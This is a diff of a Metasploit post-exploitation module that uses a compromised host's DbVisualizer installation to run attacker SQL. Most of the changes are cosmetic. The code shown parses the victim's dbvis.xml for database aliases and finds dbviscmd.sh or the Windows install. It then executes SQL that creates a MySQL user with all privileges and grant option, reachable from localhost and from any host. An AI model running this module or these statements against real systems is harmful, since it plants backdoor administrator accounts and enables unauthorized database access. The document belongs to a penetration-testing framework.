@@ -22,10 +22,10 @@ class Metasploit3 < Msf::Post
         },
         'License'       => MSF_LICENSE,
         'Author'        => [ 'David Bloom' ], # Twitter: @philophobia78
-        'References' =>
-        [
-          ['URL', 'http://youtu.be/0LCLRVHX1vA']
-        ],
+        'References'    =>
+          [
+            ['URL', 'http://youtu.be/0LCLRVHX1vA']
+          ],
         'Platform'      => %w{ linux win },
         'SessionTypes'  => [ 'meterpreter' ]
       ))
@@ -63,7 +63,7 @@ class Metasploit3 < Msf::Post
       if (user =~ /root/)
         user_base = "/root/"
       else
-         user_base="/home/#{user}/"
+         user_base = "/home/#{user}/"
       end
       dbvis_file = "#{user_base}.dbvis/config70/dbvis.xml"
     when /win/
@@ -85,7 +85,7 @@ class Metasploit3 < Msf::Post
         print_error("File not found: #{dbvis_file}")
         return
       end
-      old_version= true
+      old_version = true
     end
 
     print_status("Reading : #{dbvis_file}" )
@@ -98,10 +98,10 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    db_found=false
-    alias_found=false
-    db_type=nil
-    db_type_ok=false
+    db_found = false
+    alias_found = false
+    db_type = nil
+    db_type_ok = false
 
     # fetch config file
     raw_xml.each_line do |line|
@@ -109,7 +109,7 @@ class Metasploit3 < Msf::Post
       if line =~ /<Database id=/
         db_found = true
       elsif line =~ /<\/Database>/
-        db_found=false
+        db_found = false
       end
 
       if db_found == true
@@ -137,7 +137,7 @@ class Metasploit3 < Msf::Post
               print_good("Database #{db_type} is supported ")
             else
               print_error("Database #{db_type} is not supported (yet)")
-              db_type=nil
+              db_type = nil
             end
           alias_found = false
           end
@@ -155,7 +155,7 @@ class Metasploit3 < Msf::Post
     case session.platform
     when /linux/
       dbvis = session.shell_command("locate dbviscmd.sh").chomp
-      if dbvis.chomp==""
+      if dbvis.chomp == ""
         print_error("dbviscmd.sh not found")
         return nil
       else
@@ -181,7 +181,7 @@ class Metasploit3 < Msf::Post
            dbvis_home_dir=d
          end
       end
-      if  dbvis_home_dir.blank?
+      if dbvis_home_dir.blank?
         print_error("Dbvis home not found, maybe uninstalled ?")
         return nil
       end
@@ -197,14 +197,14 @@ class Metasploit3 < Msf::Post
 
   # Query execution method
   def dbvis_query(dbvis,sql)
-    error =false
-    resp=''
-    if file?(dbvis)==true
+    error = false
+    resp = ''
+    if file?(dbvis) == true
       f = session.fs.file.stat(dbvis)
       if f.uid == Process.euid or Process.groups.include?f.gid
         print_status("Trying to execute evil sql, it can take time ...")
         args = "-connection #{datastore['DBALIAS']} -sql \"#{sql}\""
-        dbvis ="\"#{dbvis}\""
+        dbvis = "\"#{dbvis}\""
         cmd = "#{dbvis} #{args}"
         resp = cmd_exec(cmd)
         vprint_line("")
@@ -225,17 +225,17 @@ class Metasploit3 < Msf::Post
 
   # Check if db type is supported by this script
   def check_db_type(type)
-   return  type.to_s =~ /mysql/i
+   return type.to_s =~ /mysql/i
   end
 
   # Build proper sql
   def get_sql(db_type)
     if db_type =~ /mysql/i
        sql = "CREATE USER '#{datastore['DBUSERNAME']}'@'localhost' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
-       sql += "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'localhost' WITH GRANT OPTION;"
+       sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'localhost' WITH GRANT OPTION;"
 
-       sql += "CREATE USER '#{datastore['DBUSERNAME']}'@'%' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
-       sql += "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'%' WITH GRANT OPTION;"
+       sql << "CREATE USER '#{datastore['DBUSERNAME']}'@'%' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
+       sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'%' WITH GRANT OPTION;"
        return sql
     end
     return nil
